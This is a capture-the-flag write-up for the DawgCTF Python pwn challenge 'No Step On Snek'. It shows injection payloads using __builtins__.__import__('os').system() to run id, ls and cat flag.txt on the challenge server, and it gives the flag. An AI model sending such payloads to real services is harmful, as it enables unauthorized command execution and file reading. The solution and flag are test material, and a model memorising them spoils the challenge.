# No Step On Snek
## Challenge
Type: Pwn
```
I heard you guys like python pwnables

nc umbccd.io 4000
```

## Solve
![null](src/nosteponsnek_null.png)

But the the maze changes every time and nothing happens when you give "w", "a", "s", "d" as input. A script is not the solution this time!

Let's try if we can use some python [builtins](https://docs.python.org/3.9/library/functions.html) or not, as it says in the challenge description.
```python
__builtins__.help()
```
![help](src/nosteponsnek_help.png)
We can definitely use builtins!!!

Use following for PoC:
```python
__builtins__.__import__("os").system("id")
```
![poc](src/nosteponsnek_poc.png)

Now we just need to find the flag and read it, listing can help us.
```python
__builtins__.__import__("os").system("ls -al")
```
![ls](src/nosteponsnek_ls.png)

Such a luck!
```python
__builtins__.__import__("os").system("cat flag.txt")
```
![flag](src/nosteponsnek_flag.png)

We've successfully captured the flag!! ``DawgCTF{bUt_iT'5_c@ll3d_1nput}``

***Written by f4T1H***
